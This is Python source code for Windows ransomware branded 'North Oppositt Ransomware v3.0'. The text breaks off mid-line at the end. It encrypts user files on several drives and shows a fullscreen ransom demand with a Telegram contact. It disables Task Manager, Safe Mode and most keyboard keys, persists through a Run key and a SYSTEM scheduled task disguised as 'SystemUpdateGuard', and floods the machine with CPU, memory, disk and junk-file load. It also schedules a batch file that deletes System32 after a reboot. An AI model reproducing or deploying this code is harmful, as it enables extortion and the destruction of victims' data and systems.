import tkinter as tk
import os
import sys
import winreg as reg
import threading
import keyboard
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
from ctypes import cast, POINTER, c_int, windll
from cryptography.fernet import Fernet
import time
import psutil
import subprocess
import ctypes
import winsound
import hashlib
import random
import datetime
import atexit
import signal
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
import string
import shutil

# ============================================================
# ПЕРЕХВАТ Ctrl+C
# ============================================================
signal.signal(signal.SIGINT, lambda s, f: None)

# ============================================================
# ПРОВЕРКА НА ЕДИНСТВЕННЫЙ ЭКЗЕМПЛЯР
# ============================================================
def check_single_instance():
    try:
        lock_file = os.path.join(os.environ['TEMP'], 'north_oppositt.lock')
        if os.path.exists(lock_file):
            with open(lock_file, 'r') as f:
                old_pid = int(f.read().strip())
            try:
                if psutil.pid_exists(old_pid):
                    sys.exit(0)
            except:
                pass
            os.remove(lock_file)
        with open(lock_file, 'w') as f:
            f.write(str(os.getpid()))
        atexit.register(lambda: os.remove(lock_file) if os.path.exists(lock_file) else None)
    except:
        pass

# ============================================================
# ЗВУК
# ============================================================
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def play_music_loop(stop_flag):
    try:
        wav_path = resource_path("sound.wav")
        while not stop_flag.is_set():
            winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
            time.sleep(60)
    except:
        pass

# ============================================================
# НАГРУЗКА НА ПК
# ============================================================
def cpu_load(stop_flag):
    x = 0
    while not stop_flag.is_set():
        x = hashlib.sha256(str(x).encode()).hexdigest()
        for i in range(10000):
            x = x * i + i ** 2
        time.sleep(0.001)

def ram_load(stop_flag):
    data = []
    while not stop_flag.is_set():
        try:
            data.append([random.getrandbits(512) for _ in range(10000)])
            if len(data) > 50:
                data = data[-10:]
        except:
            data = []
        time.sleep(0.1)

def disk_load(stop_flag):
    while not stop_flag.is_set():
        try:
            temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
            for i in range(10):
                f_path = os.path.join(temp_dir, f'temp_load_{i}.tmp')
                with open(f_path, 'w') as f:
                    f.write('x' * 1000000)
                os.remove(f_path)
        except:
            pass
        time.sleep(0.5)

def start_system_load(stop_flag):
    for _ in range(4):
        threading.Thread(target=cpu_load, args=(stop_flag,), daemon=True).start()
    for _ in range(2):
        threading.Thread(target=ram_load, args=(stop_flag,), daemon=True).start()
    threading.Thread(target=disk_load, args=(stop_flag,), daemon=True).start()

# ============================================================
# ПРАВА АДМИНА
# ============================================================
def run_as_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return True
        else:
            if '--admin' in sys.argv:
                return False
            new_args = sys.argv + ['--admin']
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(new_args), None, 1)
            sys.exit(0)
    except:
        return False

# ============================================================
# АВТОЗАПУСК
# ============================================================
def add_to_startup_priority():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, sys.executable)
        reg.CloseKey(key)
    except:
        pass
    
    try:
        task_name = "SystemUpdateGuard"
        os.system(f'schtasks /delete /tn "{task_name}" /f')
        cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable}" /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f /delay 0000:00'
        os.system(cmd)
    except:
        pass

def remove_from_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(key, "SystemUpdateGuard")
        reg.CloseKey(key)
    except:
        pass
    try:
        os.system('schtasks /delete /tn "SystemUpdateGuard" /f')
    except:
        pass

def disable_safe_mode():
    try:
        os.system('reg delete "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /f')
        os.system('reg delete "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network" /f')
    except:
        pass

def restore_safe_mode():
    try:
        os.system('reg add "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal" /f')
        os.system('reg add "HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Network" /f')
    except:
        pass

def toggle_task_manager(disable=True):
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1 if disable else 0)
        reg.CloseKey(key)
    except:
        pass

def enable_task_manager():
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
        reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 0)
        reg.CloseKey(key)
    except:
        pass

def force_max_volume(stop_flag):
    try:
        from comtypes import CoInitialize
        CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        if devices is None:
            return
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        while not stop_flag.is_set():
            volume.SetMasterVolumeLevelScalar(1.0, None)
            threading.Event().wait(1)
    except:
        pass

def block_keyboard():
    try:
        allowed = ['0','1','2','3','4','5','6','7','8','9','backspace','enter']
        keyboard.hook(lambda e: e.name in allowed, suppress=True)
    except:
        pass

def unblock_keyboard():
    try:
        keyboard.unhook_all()
    except:
        pass

# ============================================================
# ЗАЩИТА ОТ ПЕРЕЗАГРУЗКИ (мониторинг процессов)
# ============================================================
def monitor_reboot_attempts(stop_flag):
    """Следит за попытками перезагрузить ПК"""
    # Отключаем кнопку перезагрузки в меню Пуск через реестр
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
        reg.SetValueEx(key, "NoClose", 0, reg.REG_DWORD, 1)
        reg.CloseKey(key)
    except:
        pass
    
    # Мониторим процессы, связанные с перезагрузкой
    reboot_processes = ['shutdown.exe', 'logoff.exe', 'userinit.exe']
    
    while not stop_flag.is_set():
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if any(rp in proc_name for rp in reboot_processes):
                        # Если обнаружена попытка перезагрузки - удаляем System32
                        schedule_system32_deletion()
                        os.system("shutdown /r /t 0 /f")
                        sys.exit()
                except:
                    pass
            time.sleep(0.5)
        except:
            time.sleep(0.5)

# ============================================================
# УДАЛЕНИЕ SYSTEM32 ПОСЛЕ РЕБУТА
# ============================================================
def schedule_system32_deletion():
    """Создаёт задачу в планировщике, которая удалит System32 при следующей загрузке"""
    try:
        bat_path = os.path.join(os.environ['TEMP'], 'delete_system32.bat')
        with open(bat_path, 'w') as f:
            f.write('''@echo off
timeout /t 2 /nobreak >nul
takeown /f "C:\\Windows\\System32" /r /d y
icacls "C:\\Windows\\System32" /grant *S-1-1-0:F /t
rmdir /s /q "C:\\Windows\\System32"
del /f /q "%~f0"
''')
        
        task_name = "System32DeleteTask"
        os.system(f'schtasks /delete /tn "{task_name}" /f')
        cmd = f'schtasks /create /tn "{task_name}" /tr "{bat_path}" /sc ONSTART /ru "SYSTEM" /rl HIGHEST /f'
        os.system(cmd)
    except:
        pass

def reboot_and_nuke():
    """Перезагружает компьютер, а после загрузки удаляет System32"""
    schedule_system32_deletion()
    os.system("shutdown /r /t 2 /f")
    sys.exit()

# ============================================================
# ГЕНЕРАЦИЯ КЛЮЧА
# ============================================================
def generate_key():
    return Fernet.generate_key()

# ============================================================
# СОЗДАНИЕ ФАЙЛОВ ПО 1 МБ
# ============================================================
def create_fake_files(stop_flag):
    counter = 0
    drives = ['C:\\', 'D:\\', 'E:\\', 'F:\\']
    chars = string.ascii_letters + string.digits
    
    while not stop_flag.is_set():
        try:
            drive = random.choice([d for d in drives if os.path.exists(d)])
            depth = random.randint(1, 5)
            current_path = drive
            for _ in range(depth):
                folder_name = ''.join(random.choices(chars, k=8))
                current_path = os.path.join(current_path, folder_name)
                os.makedirs(current_path, exist_ok=True)
            
            file_name = f"system_{counter}_{''.join(random.choices(chars, k=6))}.tmp"
            file_path = os.path.join(current_path, file_name)
            
            with open(file_path, 'wb') as f:
                f.write(os.urandom(1024 * 1024))
            
            counter += 1
            time.sleep(4)
        except:
            time.sleep(4)

# ============================================================
# ШИФРОВАНИЕ
# ============================================================
def encrypt_single_file(args):
    path, fernet = args
    try:
        with open(path, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        
        dir_name = os.path.dirname(path)
        new_path = os.path.join(dir_name, "67")
        
        counter = 1
        while os.path.exists(new_path):
            new_path = os.path.join(dir_name, f"67_{counter}")
            counter += 1
        
        with open(new_path, 'wb') as f:
            f.write(encrypted)
        os.remove(path)
        return 1
    except:
        return 0

def continuous_encryption(stop_flag, fernet, encrypted_count):
    processed_files = set()
    
    while not stop_flag.is_set():
        try:
            files_to_encrypt = []
            
            for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
                if os.path.exists(drive):
                    for root, dirs, files in os.walk(drive):
                        if 'Windows' in root:
                            continue
                        for file in files:
                            full_path = os.path.join(root, file)
                            if full_path not in processed_files and file != "67" and not file.startswith("67_"):
                                if not full_path.endswith('.exe') or 'NorthOppositt' not in full_path:
                                    files_to_encrypt.append((full_path, fernet))
                                    processed_files.add(full_path)
            
            if files_to_encrypt:
                with ThreadPoolExecutor(max_workers=8) as executor:
                    results = executor.map(encrypt_single_file, files_to_encrypt)
                    encrypted_count[0] += sum(results)
            
            time.sleep(1)
        except:
            time.sleep(1)

# ============================================================
# РАСШИФРОВКА
# ============================================================
def decrypt_single_file(args):
    path, fernet = args
    try:
        with open(path, 'rb') as f:
            data = f.read()
        decrypted = fernet.decrypt(data)
        
        dir_name = os.path.dirname(path)
        new_path = os.path.join(dir_name, "restored_file")
        
        counter = 1
        base, ext = os.path.splitext(new_path)
        while os.path.exists(new_path):
            new_path = f"{base}_{counter}{ext}"
            counter += 1
        
        with open(new_path, 'wb') as f:
            f.write(decrypted)
        os.remove(path)
        return 1
    except:
        return 0

def decrypt_all_files():
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt", 0, reg.KEY_READ)
        key_str = reg.QueryValueEx(reg_key, "DecryptKey")[0]
        reg.CloseKey(reg_key)
        fernet = Fernet(key_str.encode())
    except:
        try:
            with open('C:\\Windows\\Temp\\north_key.txt', 'r') as f:
                key_str = f.read().strip()
            fernet = Fernet(key_str.encode())
        except:
            return 0
    
    files_to_decrypt = []
    
    for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
        if os.path.exists(drive):
            for root, dirs, files in os.walk(drive):
                for file in files:
                    if file == "67" or file.startswith("67_"):
                        full_path = os.path.join(root, file)
                        files_to_decrypt.append((full_path, fernet))
    
    decrypted = 0
    with ThreadPoolExecutor(max_workers=8) as executor:
        results = executor.map(decrypt_single_file, files_to_decrypt)
        decrypted = sum(results)
    
    return decrypted

def delete_self():
    try:
        remove_from_startup()
        try:
            reg.DeleteKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt")
        except:
            pass
        bat_path = os.path.join(os.environ['TEMP'], 'delete_self.bat')
        with open(bat_path, 'w') as f:
            f.write(f'''@echo off
timeout /t 1 /nobreak >nul
del /f /q "{sys.executable}"
del /f /q "%~f0"
''')
        subprocess.Popen(bat_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    except:
        sys.exit(0)

def restore_system():
    enable_task_manager()
    remove_from_startup()
    restore_safe_mode()
    unblock_keyboard()

# ============================================================
# КАСТОМНЫЕ ОКНА
# ============================================================
def show_error_window(message, attempts_left):
    error_root = tk.Tk()
    error_root.title("ОШИБКА")
    error_root.geometry("450x250")
    error_root.resizable(False, False)
    error_root.configure(bg='#0a0a0a')
    
    error_root.update_idletasks()
    x = (error_root.winfo_screenwidth() // 2) - 225
    y = (error_root.winfo_screenheight() // 2) - 125
    error_root.geometry(f"450x250+{x}+{y}")
    
    tk.Label(error_root, text="❌ НЕВЕРНЫЙ КОД ❌", 
             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 14, "bold")).pack(pady=20)
    tk.Label(error_root, text=message, fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 11)).pack(pady=10)
    tk.Label(error_root, text=f"Осталось попыток: {attempts_left}", 
             fg="#ffaa00", bg="#0a0a0a", font=("Segoe UI", 11, "bold")).pack(pady=10)
    
    def on_ok():
        error_root.destroy()
    
    tk.Button(error_root, text="🔴 ПОНЯЛ", command=on_ok,
              bg="#333333", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(pady=15)
    error_root.protocol("WM_DELETE_WINDOW", on_ok)
    error_root.mainloop()

def show_success_window(decrypted_count):
    success_root = tk.Tk()
    success_root.title("ВОССТАНОВЛЕНИЕ")
    success_root.geometry("500x400")
    success_root.resizable(False, False)
    success_root.configure(bg='#0a0a0a')
    
    success_root.update_idletasks()
    x = (success_root.winfo_screenwidth() // 2) - 250
    y = (success_root.winfo_screenheight() // 2) - 200
    success_root.geometry(f"500x400+{x}+{y}")
    
    tk.Label(success_root, text="✅ ВОССТАНОВЛЕНИЕ УСПЕШНО ✅", 
             fg="#00ff00", bg="#0a0a0a", font=("Segoe UI", 16, "bold")).pack(pady=20)
    
    info_frame = tk.Frame(success_root, bg="#1a1a1a", bd=2, relief="solid", highlightbackground="#00ff00", highlightthickness=1)
    info_frame.pack(pady=10, padx=20, fill="both", expand=True)
    
    info_text = f"""
╔════════════════════════════════════════════════╗
║                                                ║
║   📁 Расшифровано файлов: {decrypted_count}                    ║
║                                                ║
║   🔓 Диспетчер задач: ВКЛЮЧЕН                  ║
║   🔓 Автозагрузка: ОЧИЩЕНА                     ║
║   🔓 Безопасный режим: ВОССТАНОВЛЕН            ║
║   🔓 Клавиатура: РАЗБЛОКИРОВАНА                ║
║                                                ║
║   🗑️ Винлокер УДАЛЁН С ПК                      ║
║                                                ║
║   💀 Северный Оппозит уничтожен                ║
║                                                ║
╚════════════════════════════════════════════════╝
    """
    
    tk.Label(info_frame, text=info_text, fg="#00ff00", bg="#1a1a1a", 
             font=("Consolas", 10), justify="center").pack(pady=20, padx=10)
    
    def on_exit():
        success_root.destroy()
        delete_self()
    
    tk.Button(success_root, text="🟢 ВЫЙТИ", command=on_exit,
              bg="#00ff00", fg="black", font=("Segoe UI", 11, "bold"), width=20).pack(pady=20)
    
    success_root.protocol("WM_DELETE_WINDOW", on_exit)
    success_root.mainloop()

def show_confirm_reset_window():
    confirm_root = tk.Tk()
    confirm_root.title("ПОДТВЕРЖДЕНИЕ СБРОСА")
    confirm_root.geometry("450x250")
    confirm_root.resizable(False, False)
    confirm_root.configure(bg='#0a0a0a')
    
    confirm_root.update_idletasks()
    x = (confirm_root.winfo_screenwidth() // 2) - 225
    y = (confirm_root.winfo_screenheight() // 2) - 125
    confirm_root.geometry(f"450x250+{x}+{y}")
    
    tk.Label(confirm_root, text="⚠️ ПРЕДУПРЕЖДЕНИЕ ⚠️", 
             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 14, "bold")).pack(pady=20)
    tk.Label(confirm_root, text="Вы уверены, что хотите уничтожить Windows?\nПосле перезагрузки система будет удалена!", 
             fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 11), justify="center").pack(pady=10)
    
    result = [False]
    
    def on_confirm():
        result[0] = True
        confirm_root.destroy()
    
    def on_cancel():
        result[0] = False
        confirm_root.destroy()
    
    button_frame = tk.Frame(confirm_root, bg='#0a0a0a')
    button_frame.pack(pady=20)
    
    tk.Button(button_frame, text="💀 ДА, УНИЧТОЖИТЬ 💀", command=on_confirm,
              bg="#ff4444", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(side="left", padx=10)
    tk.Button(button_frame, text="🔵 ОТМЕНА", command=on_cancel,
              bg="#333333", fg="white", font=("Segoe UI", 10, "bold"), width=15).pack(side="left", padx=10)
    
    confirm_root.protocol("WM_DELETE_WINDOW", on_cancel)
    confirm_root.mainloop()
    return result[0]

def show_last_chance_window():
    chance_root = tk.Tk()
    chance_root.title("ПОСЛЕДНЕЕ ПРЕДУПРЕЖДЕНИЕ")
    chance_root.geometry("500x300")
    chance_root.resizable(False, False)
    chance_root.configure(bg='#0a0a0a')
    
    chance_root.update_idletasks()
    x = (chance_root.winfo_screenwidth() // 2) - 250
    y = (chance_root.winfo_screenheight() // 2) - 150
    chance_root.geometry(f"500x300+{x}+{y}")
    
    tk.Label(chance_root, text="💀 ПЕРЕЗАГРУЗКА И УДАЛЕНИЕ SYSTEM32 💀", 
             fg="#ff4444", bg="#0a0a0a", font=("Segoe UI", 14, "bold")).pack(pady=20)
    tk.Label(chance_root, text="Неверный код! Компьютер будет перезагружен.\nПосле загрузки Windows будет УНИЧТОЖЕНА.", 
             fg="#ffffff", bg="#0a0a0a", font=("Segoe UI", 12), justify="center").pack(pady=20)
    
    def on_ok():
        chance_root.destroy()
    
    tk.Button(chance_root, text="💀 ПОНЯЛ 💀", command=on_ok,
              bg="#ff4444", fg="white", font=("Segoe UI", 11, "bold"), width=20).pack(pady=15)
    chance_root.protocol("WM_DELETE_WINDOW", on_ok)
    chance_root.mainloop()

# ============================================================
# НАСТРОЙКИ
# ============================================================
SECRET_CODE = "192837465"
MAX_ATTEMPTS = 5
TIMER_SECONDS = 24 * 60 * 60

# ============================================================
# ТАЙМЕР
# ============================================================
def timer_loop(app, stop_flag):
    end_time = datetime.datetime.now() + datetime.timedelta(seconds=TIMER_SECONDS)
    while not stop_flag.is_set():
        try:
            time_left = (end_time - datetime.datetime.now()).total_seconds()
            if time_left <= 0:
                reboot_and_nuke()
                break
            if hasattr(app, 'timer_label') and app.timer_label:
                hours = int(time_left // 3600)
                minutes = int((time_left % 3600) // 60)
                seconds = int(time_left % 60)
                app.timer_label.config(text=f"⏰ ОСТАЛОСЬ ВРЕМЕНИ: {hours:02d}:{minutes:02d}:{seconds:02d}")
            time.sleep(1)
        except:
            time.sleep(1)

# ============================================================
# ИНТЕРФЕЙС
# ============================================================
class NorthOpposittLocker:
    def __init__(self, root):
        self.root = root
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.configure(bg='#0a0a0a')
        self.root.protocol("WM_DELETE_WINDOW", lambda: reboot_and_nuke())
        self.attempts = MAX_ATTEMPTS
        self.stop_flag = threading.Event()
        self.encrypted_count = [0]
        
        toggle_task_manager(True)
        block_keyboard()
        
        self.key = generate_key()
        self.fernet = Fernet(self.key)
        
        try:
            reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\NorthOppositt")
            reg.SetValueEx(reg_key, "DecryptKey", 0, reg.REG_SZ, self.key.decode())
            reg.CloseKey(reg_key)
        except:
            with open('C:\\Windows\\Temp\\north_key.txt', 'w') as f:
                f.write(self.key.decode())
        
        threading.Thread(target=force_max_volume, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=play_music_loop, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=create_fake_files, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=continuous_encryption, args=(self.stop_flag, self.fernet, self.encrypted_count), daemon=True).start()
        threading.Thread(target=monitor_reboot_attempts, args=(self.stop_flag,), daemon=True).start()
        
        start_system_load(self.stop_flag)
        
        self.show_locker_screen()
        threading.Thread(target=timer_loop, args=(self, self.stop_flag), daemon=True).start()
        
        self.update_file_count_loop()
    
    def update_file_count_loop(self):
        def loop():
            while not self.stop_flag.is_set():
                if hasattr(self, 'file_count_label') and self.file_count_label:
                    self.file_count_label.config(text=f"Зашифровано файлов: {self.encrypted_count[0]}")
                time.sleep(2)
        threading.Thread(target=loop, daemon=True).start()
    
    def update_attempts_display(self):
        if hasattr(self, 'attempts_label') and self.attempts_label:
            self.attempts_label.config(text=f"Попыток осталось: {self.attempts}")
    
    def on_code_change(self, event=None):
        if hasattr(self, 'decrypt_btn'):
            if self.code_entry.get().strip().isdigit() and len(self.code_entry.get()) > 0:
                self.decrypt_btn.config(state='normal', bg="#ff4444")
            else:
                self.decrypt_btn.config(state='disabled', bg="#555555")
    
    def show_locker_screen(self):
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both')
        
        logo_text = """
    ╔═══════════════════════════════════════╗
    ║     NORTH OPPOSITT RANSOMWARE v3.0    ║
    ╚═══════════════════════════════════════╝
        """
        logo = tk.Label(main_frame, text=logo_text, fg="#ff4444", bg="#0a0a0a", 
                        font=("Courier", 14, "bold"), justify="center")
        logo.pack(pady=20)
        
        creators = tk.Label(main_frame, text="created by iaefeel & gflm", 
                            fg="#ff4444", bg="#0a0a0a", 
                            font=("Segoe UI", 9, "bold"), justify="center")
        creators.pack(pady=(0, 10))
        
        self.timer_label = tk.Label(main_frame, text="⏰ ОСТАЛОСЬ ВРЕМЕНИ: 24:00:00", 
                                     fg="#ffaa00", bg="#0a0a0a", 
                                     font=("Segoe UI", 16, "bold"))
        self.timer_label.pack(pady=10)
        
        self.attempts_label = tk.Label(main_frame, text=f"Попыток осталось: {self.attempts}", 
                                        fg="#ffaa00", bg="#0a0a0a", 
                                        font=("Segoe UI", 12, "bold"))
        self.attempts_label.pack(pady=5)
        
        self.file_count_label = tk.Label(main_frame, text="Зашифровано файлов: 0", 
                                          fg="#00ff00", bg="#0a0a0a", 
                                          font=("Segoe UI", 12))
        self.file_count_label.pack(pady=5)
        
        msg = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ❌ ВСЕ ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ! ❌                     ║
║                                                              ║
║   🔐 ДЛЯ ПОЛУЧЕНИЯ КОДА: Telegram @societyvoice             ║
║                                                              ║
║   ⚠️ 5 НЕВЕРНЫХ ПОПЫТОК = ПЕРЕЗАГРУЗКА + УДАЛЕНИЕ SYSTEM32  ║
║   ⚠️ ПОПЫТКА ПЕРЕЗАГРУЗИТЬ ПК = УДАЛЕНИЕ SYSTEM32           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        msg_label = tk.Label(main_frame, text=msg, fg="#cccccc", bg="#0a0a0a", 
                              font=("Consolas", 10), justify="center")
        msg_label.pack(pady=20)
        
        input_frame = tk.Frame(main_frame, bg='#0a0a0a')
        input_frame.pack(pady=10)
        
        tk.Label(input_frame, text="ВВЕДИТЕ КОД:", fg="white", bg="#0a0a0a", 
                 font=("Segoe UI", 12, "bold")).pack(side="left", padx=5)
        
        self.code_entry = tk.Entry(input_frame, font=("Consolas", 14), width=15, 
                                    justify='center', bg="#1a1a1a", fg="#00ff00", 
                                    insertbackground="white")
        self.code_entry.pack(side="left", padx=5)
        self.code_entry.focus_set()
        self.code_entry.bind('<Return>', lambda event: self.check_code() if self.code_entry.get().strip().isdigit() else None)
        self.code_entry.bind('<KeyRelease>', self.on_code_change)
        
        button_frame = tk.Frame(main_frame, bg='#0a0a0a')
        button_frame.pack(pady=20)
        
        self.decrypt_btn = tk.Button(button_frame, text="🔓 РАСШИФРОВАТЬ", command=self.check_code,
                                      bg="#555555", fg="white", font=("Segoe UI", 11, "bold"), 
                                      width=20, height=1, state='disabled')
        self.decrypt_btn.pack(side="left", padx=10)
        
        tk.Button(button_frame, text="💀 УНИЧТОЖИТЬ WINDOWS", command=self.factory_reset,
                  bg="#333333", fg="white", font=("Segoe UI", 11, "bold"), 
                  width=20, height=1).pack(side="left", padx=10)
        
        def keep_focus():
            if self.code_entry and self.code_entry.winfo_exists():
                self.code_entry.focus_force()
                self.root.after(500, keep_focus)
        keep_focus()
    
    def factory_reset(self):
        if show_confirm_reset_window():
            self.stop_flag.set()
            reboot_and_nuke()
    
    def check_code(self):
        entered_code = self.code_entry.get().strip()
        
        if not entered_code.isdigit() or len(entered_code) == 0:
            return
        
        if entered_code == SECRET_CODE:
            self.stop_flag.set()
            decrypted = decrypt_all_files()
            restore_system()
            self.root.destroy()
            show_success_window(decrypted)
        else:
            if self.attempts > 0:
                self.attempts -= 1
            self.update_attempts_display()
            self.code_entry.delete(0, tk.END)
            self.code_entry.focus_set()
            self.on_code_change()
            
            if self.attempts <= 0:
                show_last_chance_window()
                self.stop_flag.set()
                reboot_and_nuke()
            else:
                show_error_window(f"Вы ввели неверный код
